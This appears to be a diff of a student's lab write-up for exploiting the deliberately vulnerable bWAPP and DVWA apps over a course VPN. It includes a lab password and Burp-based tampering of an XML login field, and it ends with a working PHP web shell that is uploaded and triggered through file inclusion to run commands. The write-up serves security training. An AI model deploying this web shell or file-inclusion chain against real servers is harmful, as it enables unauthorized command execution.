@@ -7,7 +7,7 @@
 - open Kali VM
 - open terminal in `c22` folder
 - run `sudo openvpn hacknet.ovpn`
-- introduce password received on email
+- introduce password received on email (H8kZ8j)
 - access link `https://10.200.10.1/hnet` in browser
 - for this assignment I've accessed the server with ip address `10.200.122.18`
 - It should be here
@@ -255,13 +255,35 @@ So, the new url will look like this: `http://10.200.122.18/bWAPP/insecure_direct
 
 ## 4. By exploiting the "OWASP bWapp" section "Insecure DOR (Reset Secret)" and "OWASP bWapp" / "Insecure DOR (Change Secret)" you change the name of the user making the request.
 
+- Insecure DOR (Change Secret)
+
+![8](./8.png)
+
+Before completing the exercise, I've installed the [Burp Suite Community Edition](https://portswigger.net/burp/releases/professional-community-2025-3-4?requestededition=community&requestedplatform=) tool for intercepting requests.
+
+Then I've opened the app locally and from there a browser from where I access the bWapp application. Turned on the Interception.
+
+![16](./16.png)
+
+When pressing `Any bugs?` button, the xxe-2.php request is send, but intercepted by burp on the right side.
+
+Inspecting the request data, I saw that an xml data is sent
+
+```xml
+<reset><login>bee</login><secret>Any bugs?</secret></reset>
+```
+
+The login tag represents the user. So this can be changed and after that forwarded. This can be checked in the final request's response.
+
+![17](./17.png)
+
 - Insecure DOR (Reset Secret)
 
 ![7](./7.png)
 
-- Insecure DOR (Change Secret)
+The same approach was applied for Reset Secret too, but the file open from url should be `http://10.200.122.18/bWAPP/insecure_direct_object_ref_3.php`
 
-![8](./8.png)
+![18](./18.png)
 
 ## 5. By exploiting the "Damn Vulnerable Web " "File Inclusion" section, display the contents of the files: /etc/passwd, /etc/hosts, /etc/locale.alias, /etc/networks, /etc/group.
 
@@ -285,3 +307,31 @@ Credentials:
 ![15](./15.png)
 
 ## 6. Exploit the "Damn Vulnerable Web App" application's "File Inclusion" section so that you can remotely execute commands on the attacked computer.
+
+Credentials: admin, admin
+
+Before completing the exercise, I've build a php server locally:
+
+```
+<?php
+if (isset($_GET['cmd'])) {
+    $cmd = $_GET['cmd'];
+    $output = shell_exec($cmd);
+    echo "<pre>$output</pre>";
+} else {
+    echo "No command provided.";
+}
+?>
+```
+
+After that I've uploaded this php file via `Upload` section.
+
+Then, It has shown me the path where the file was downloaded: `../../hackable/uploads/shell.php`
+
+I also want to inject the file with a certain command to see if it works as expected. It should execute the command provided. The url will be `http://10.200.122.18/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.php?cmd=ls`
+
+![19](./19.png)
+
+Double checked with bwapp app
+
+![20](20.png)
